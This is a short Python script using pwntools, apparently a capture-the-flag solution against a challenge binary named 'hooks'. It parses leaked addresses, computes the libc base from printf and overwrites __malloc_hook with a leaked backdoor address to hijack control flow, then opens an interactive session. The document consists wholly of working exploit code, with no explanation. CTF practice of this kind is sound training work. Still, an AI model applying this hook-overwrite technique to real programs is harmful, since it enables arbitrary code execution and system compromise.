#!/usr/bin/env python3
from pwn import *

p = process('./hooks')
libc = ELF('./libc-2.31.so')

p.recvuntil(b'backdoor: ')
backdoor = int(p.recvline()[:-1], 16)

p.recvuntil(b'printf  : ')
printf = int(p.recvline()[:-1], 16)

libc.address = printf - libc.symbols['printf']

log.info(hex(libc.address))

p.sendlineafter(b'Address:', hex(libc.symbols['__malloc_hook']))
p.sendlineafter(b'Value:', hex(backdoor))


p.interactive()
